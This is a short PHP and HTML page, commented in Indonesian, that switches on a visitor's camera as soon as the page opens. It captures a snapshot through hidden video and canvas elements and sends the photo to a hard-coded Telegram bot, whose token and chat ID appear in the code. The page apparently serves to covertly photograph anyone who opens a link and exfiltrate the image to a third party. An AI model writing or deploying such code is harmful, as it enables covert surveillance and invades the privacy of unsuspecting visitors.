<?php
// --- Bagian BACKEND (proses upload dan kirim ke Telegram) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo'])) {
    $botToken = '7779236534:AAEU6uV3iQxsPmBqv77YM1puM4H9bRXmvyE';
    $chatId = '7799140879';

    $photoPath = $_FILES['photo']['tmp_name'];

    $url = "https://api.telegram.org/bot$botToken/sendPhoto";

    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile($photoPath)
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postFields
    ]);

    $result = curl_exec($ch);
    curl_close($ch);

    echo 'Gambar dikirim ke Telegram!';
    exit;
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Ambil dan Kirim Gambar</title>
</head>
<body>
  <h2>Mengambil dan mengirim gambar ke bot...</h2>
  <video id="video" autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setTimeout(() => {
            // Ambil snapshot dari video
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
              const formData = new FormData();
              formData.append('photo', blob, 'snapshot.png');

              fetch('', {
                method: 'POST',
                body: formData
              })
              .then(res => res.text())
              .then(response => {
                console.log(response);
              });

              // Matikan kamera
              stream.getTracks().forEach(track => track.stop());
            }, 'image/png');
          }, 1000); // tunggu 1 detik agar kamera siap
        };
      } catch (err) {
        alert('Gagal akses kamera: ' + err.message);
      }
    }

    window.onload = startCamera;
  </script>
</body>
</html>
